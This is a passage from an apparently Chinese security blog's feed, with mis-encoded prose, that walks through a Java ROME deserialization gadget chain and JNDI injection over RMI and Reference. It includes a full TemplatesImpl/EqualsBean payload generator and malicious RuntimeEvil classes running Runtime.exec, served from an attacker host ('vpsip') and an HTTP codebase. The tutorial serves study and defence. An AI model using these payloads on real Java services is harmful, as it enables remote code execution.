org.apache.shiro.crypto.hash.Hash;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//HashSet.readObject</span></span><br><span class="line"><span class="comment">//HashMap.put</span></span><br><span class="line"><span class="comment">//HashMap.putval</span></span><br><span class="line"><span class="comment">//HashMap.equals</span></span><br><span class="line"><span class="comment">//AbastractMap.equals</span></span><br><span class="line"><span class="comment">//EqualsBean.equals</span></span><br><span class="line"><span class="comment">//EqualsBean.beanEquals</span></span><br><span class="line"><span class="comment">//TemplatesImpl.getOutputProperties()</span></span><br><span class="line"><span class="comment">//or</span></span><br><span class="line"><span class="comment">//HashTable.readObject(ObjectInputStream)</span></span><br><span class="line"><span class="comment">//HashTable.reconstitutionPut()</span></span><br><span class="line"><span class="comment">//HashMap.equals</span></span><br><span class="line"><span class="comment">//AbstractMap.equals</span></span><br><span class="line"><span class="comment">//EqualsBean.equals</span></span><br><span class="line"><span class="comment">//EqualsBean.beanEquals</span></span><br><span class="line"><span class="comment">//TemplatesImpl.getOutputProperties()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_EqualsBeans</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">fakeTemplates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">fakehashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(HashMap.class, fakehashMap);</span><br><span class="line"><span class="comment">//        equalsBean.equals(fakeTemplates);</span></span><br><span class="line"><span class="comment">//        HashSet hashSet = new HashSet();</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap1.put(<span class="string">&quot;zZ&quot;</span>, fakeTemplates);</span><br><span class="line">        hashMap1.put(<span class="string">&quot;yy&quot;</span>, equalsBean);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;zZ&quot;</span>, equalsBean);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;yy&quot;</span>, fakeTemplates);</span><br><span class="line">        hashtable.put(hashMap2,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(hashMap1,<span class="number">2</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_beanClassField</span> <span class="operator">=</span> EqualsBean.class.getDeclaredField(<span class="string">&quot;_beanClass&quot;</span>);</span><br><span class="line">        _beanClassField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _beanClassField.set(equalsBean, Templates.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_objField</span> <span class="operator">=</span> EqualsBean.class.getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">        _objField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _objField.set(equalsBean, templatesClass);</span><br><span class="line">        serialize(hashtable);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ROMEé“¾å…¶å®è·Ÿä¸ªå°è®­ç»ƒä¸€æ ·ï¼Œæ ¹æ®è°ƒç”¨é“¾èƒ½è‡ªå·±å¾ˆè½»æ¾åœ°å†™å‡ºpayloadã€‚ä¸‹ä¸ªæœˆæ‰“åä¸ºæ¯åˆ«æ‹–äººåè…¿å•Šï¼fightingï¼</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> æ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ROME </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDIæ³¨å…¥(InitialContext.lookup)</title>
      <link href="/2024/09/25/jndi-zhu-ru/"/>
      <url>/2024/09/25/jndi-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>JNDIæ˜¯ä¸€ç§å‘½åæœåŠ¡ï¼Œå…¨ç§°å«Java Naming and Directory Interface</p><p>å¼€å‘è€…å¯ä»¥è®²JNDI APIæ˜ å°„ä¸ºç‰¹å®šçš„å‘½åæœåŠ¡å’Œç›®å½•ç³»ç»Ÿã€‚</p><p>å•çº¯çš„æ–‡å­—è®²ç€å¯èƒ½å¾ˆæŠ½è±¡ï¼Œæ¥çœ‹case</p><p>RMIä¸­ï¼Œæä¾›ä¸€ä¸ªè¿œç¨‹å¯¹è±¡ï¼Œå¹¶åœ¨å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><h2 id="JNDIç»‘å®šRMI"><a href="#JNDIç»‘å®šRMI" class="headerlink" title="JNDIç»‘å®šRMI"></a>JNDIç»‘å®šRMI</h2><h3 id="RMIServer"><a href="#RMIServer" class="headerlink" title="RMIServer"></a>RMIServer</h3><ul><li>ä¸€ä¸ªå…¬ç”¨çš„ç»§æ‰¿Remoteçš„æ¥å£RemoteInterface</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ä¸€ä¸ªè¿œç¨‹å¯¹è±¡RemoteImpl</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteInterface</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello &quot;</span> + name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>RMIServerï¼Œåœ¨é‡Œé¢æ–°å»ºäº†æ³¨å†Œä¸­å¿ƒå¹¶ç»‘å®šè¿œç¨‹å¯¹è±¡</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">RemoteInterface</span> <span class="variable">remoteImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;remoteImpl&quot;</span>, remoteImpl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="RMIClient"><a href="#RMIClient" class="headerlink" title="RMIClient"></a>RMIClient</h3><ul><li>åŒä¸Šï¼Œå…¬ç”¨çš„ç»§æ‰¿Remoteçš„æ¥å£RemoteInterface</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>RMIClientï¼Œè·å–æ³¨å†Œä¸­å¿ƒï¼Œè·å–è¿œç¨‹å¯¹è±¡ï¼Œå¹¶æ‰§è¡Œæ–¹æ³•</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">RemoteInterface</span> <span class="variable">remoteImpl</span> <span class="operator">=</span> (RemoteInterface) registry.lookup(<span class="string">&quot;remoteImpl&quot;</span>);</span><br><span class="line">        System.out.println(remoteImpl.sayHello(<span class="string">&quot;RMI&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œä»¥ä¸Šä»£ç å¯ä»¥æ”¹æˆJNDIå°è£…çš„å½¢å¼ï¼Œå®ç°åŒæ ·çš„åŠŸèƒ½</p><h3 id="JNDIServerï¼ˆRMIï¼‰"><a href="#JNDIServerï¼ˆRMIï¼‰" class="headerlink" title="JNDIServerï¼ˆRMIï¼‰"></a>JNDIServerï¼ˆRMIï¼‰</h3><p>RemoteInterfaceã€RemoteImplã€RMIServerçš„ä¸‰ä¸ªä»£ç éƒ½ä¸å˜ï¼ŒåŠ ä¸€ä¸ªJNDIServerè¿›è¡Œå°è£…</p><ul><li>JNDIServerã€‚åˆ›å»ºä¸€ä¸ªåˆå§‹ä¸Šä¸‹æ–‡ï¼Œrebindé‡æ–°ç»‘å®šè¿œç¨‹å¯¹è±¡</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.rebind(<span class="string">&quot;rmi://localhost:1099/remoteImpl&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteImpl</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆå¼€RMIServerï¼Œå†å¼€JNDIServer</p><h3 id="JNDIClientï¼ˆRMIï¼‰"><a href="#JNDIClientï¼ˆRMIï¼‰" class="headerlink" title="JNDIClientï¼ˆRMIï¼‰"></a>JNDIClientï¼ˆRMIï¼‰</h3><p>ä¸å†éœ€è¦RMIClientï¼Œæ¢æˆJNDIClientæ¥è°ƒç”¨</p><ul><li>JNDIClient</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDNIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (RemoteInterface) initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/remoteImpl&quot;</span>);</span><br><span class="line">        remoteObject.sayHello(<span class="string">&quot;JNDI&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ç°å’ŒRMIServer,RMIClientä¸€æ ·çš„æ•ˆæœ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925143636081.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925143636081.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p>JNDIç»‘å®šRMIï¼Œå®é™…ä¸Šåªæ˜¯åšäº†ä¸ªå°è£…ï¼Œè¿˜æ˜¯é€šè¿‡RMIæ¥å®ç°çš„ã€‚ä¹Ÿå°±æ˜¯è¯´å¯¹RMIçš„æ”»å‡»åŒæ ·å¯¹JNDIç»‘å®šRMIçš„ç¯å¢ƒå¥æ•ˆ</p><p>JNDIServeræ‰“ä¸ªæ–­ç‚¹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144618924.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144618924.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·Ÿç€ä½ å°±å‘ç°ï¼Œæ¥åˆ°äº†RegistryImpl_Stub.rebind()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144730278.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144730278.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åŒç†ï¼Œåœ¨RMIClientæ‰“ä¸ªæ–­ç‚¹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144820417.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144820417.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ¥åˆ°äº†RegistryImpl_Stub.lookup()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144906185.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144906185.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å®Œç¾ç¬¦åˆRMIæ­¥éª¤</p><p>RMIèƒ½æ‰“çš„éƒ½èƒ½æ‰“ï¼Œåªè¦åœ¨ç‰ˆæœ¬å†…</p><h3 id="æ¶æ„RMI-Server"><a href="#æ¶æ„RMI-Server" class="headerlink" title="æ¶æ„RMI Server"></a>æ¶æ„RMI Server</h3><p>JDK&lt;&#x3D;8u121</p><p>ä½†è¿™é‡Œè¿˜æœ‰ä¸ªé—®é¢˜ï¼Œå‡å¦‚è¯´æœåŠ¡å™¨æœ‰ä»£ç é•¿JNDIClientè¿™æ ·ï¼Œè°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•ï¼Œå†å‡å¦‚lookupçš„å‚æ•°æˆ‘ä»¬å¯ä»¥æ§åˆ¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">RemoteInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (RemoteInterface) initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/remoteImpl&quot;</span>);</span><br><span class="line">remoteObject.sayHello(<span class="string">&quot;JNDI&quot;</span>);</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸æ˜¯æˆ‘ä»¬å°±èƒ½èµ·ä¸€ä¸ªæ¶æ„Serverï¼Œè®©è¿™ä¸ªlookupåŠ è½½æˆ‘ä»¬çš„æ¶æ„è¿œç¨‹ç±»ã€‚Noï¼Œå› ä¸ºRMIéœ€è¦å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯æ‹¥æœ‰åŒä¸€è¿œç¨‹æ¥å£ã€‚æ¯”å¦‚è¿™ä¸ªcaseï¼Œæˆ‘ä»¬å¼€ç›²ç›’æ²¡åŠæ³•çŸ¥é“RemoteInterfaceçš„ä»£ç ã€‚å½“ç„¶å¦‚æœä½ çŸ¥é“çš„è¯ï¼Œå°±èƒ½è¿™ä¹ˆæ‰“</p><p>æ”»å‡»æœºï¼š</p><p>éœ€è¦æœ‰RMIServerã€å’ŒæœåŠ¡å™¨ç›¸åŒçš„RemoteInterfaceæ¥å£ã€‚</p><p>å¦å¤–å¤šå‡ºä¸€ä¸ªæ¶æ„å¯¹è±¡å’Œæ¶æ„JNDIæœåŠ¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeEvil</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteInterface</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RuntimeEvil</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilJNDIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.rebind(<span class="string">&quot;rmi://vpsip:port/remoteImpl&quot;</span>, <span class="keyword">new</span> <span class="title class_">RuntimeEvil</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨ï¼š</p><p>æ§åˆ¶lookupå‚æ•°ä¸º<code>rmi://vpsip:port/remoteImpl</code>ï¼Œå¿…é¡»è¦è°ƒç”¨sayHelloæ‰èƒ½å‘½ä»¤æ‰§è¡Œ</p><p>è€ŒRMIå°±ä¸èƒ½è¿™ä¹ˆæ‰“ï¼Œå› ä¸ºRMIä¸­æˆ‘ä»¬ä¸èƒ½æ§åˆ¶URLï¼Œéœ€è¦å¤šä¸€ä¸ªè·å–æ³¨å†Œä¸­å¿ƒçš„éƒ¨åˆ†ï¼Œä½†æ˜¯å½“ç„¶å¯ä»¥JRMPæ‰“</p><h2 id="JNDIç»‘å®šReference"><a href="#JNDIç»‘å®šReference" class="headerlink" title="JNDIç»‘å®šReference"></a>JNDIç»‘å®šReference</h2><p>æœåŠ¡ç«¯åŒæ ·éœ€è¦RemoteInterfaceã€RemoteImplã€RMIServer</p><p>JNDIServeræ¢ä¸ªæ–¹å¼ç»‘å®šç½¢äº†ï¼Œçœ‹åˆ°ä¸Šé¢åŠ è½½RuntimeEvilçš„ä¾‹å­äº†å—ï¼Œéœ€è¦çŸ¥é“æœåŠ¡å™¨RemoteInterfaceçš„ä»£ç ï¼Œå¹¶ç»§æ‰¿UnicastRemoteObjectã€‚è€Œç»è¿‡Referenceå°è£…å°±ä¸ç”¨</p><h3 id="æ¶æ„-Reference-Server"><a href="#æ¶æ„-Reference-Server" class="headerlink" title="æ¶æ„ Reference Server"></a>æ¶æ„ Reference Server</h3><p>RuntimeEvil.class</p><p>æˆ‘ä»¬çš„ç±»åœ¨å®ä¾‹åŒ–åä¸èƒ½è½¬åŒ–ä¸ºObjectFactory<code>(ObjectFactory) clas.newInstance()</code>ã€‚è®©æˆ‘ä»¬çš„ç±»ç»§æ‰¿ObjectFactoryå³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeEvil</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RuntimeEvil</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦åœ¨RuntimeEvil.classæ‰€åœ¨è·¯å¾„å¼€ä¸€ä¸ªhttpæœåŠ¡ </p><p><code>python -m http.server 8888</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIReferenceServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;RuntimeEvil&quot;</span>, <span class="string">&quot;RuntimeEvil&quot;</span>, <span class="string">&quot;http://localhost:8888/&quot;</span>);</span><br><span class="line">        context.rebind(<span class="string">&quot;rmi://localhost:1099/remoteImpl&quot;</span>, reference);</span><br><span class="line">    &#125;</span><br><span 